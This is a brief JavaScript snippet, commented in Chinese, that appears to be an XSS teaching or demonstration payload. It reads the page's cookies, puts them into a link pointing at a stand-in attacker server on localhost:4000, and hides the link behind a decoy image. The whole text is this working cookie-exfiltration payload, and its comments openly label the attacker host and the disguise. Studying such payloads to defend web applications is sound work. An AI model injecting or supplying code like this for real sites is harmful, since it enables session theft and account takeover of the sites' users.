var Str=document.cookie;               //获取cookie
var a =document.createElement('a');        //创建a标签
a.href='http://localhost:4000/getCookie?a='+Str;   //攻击者主机
a.innerHTML="<img src='http://localhost:4000/img'>";        //掩护图片
document.body.appendChild(a);   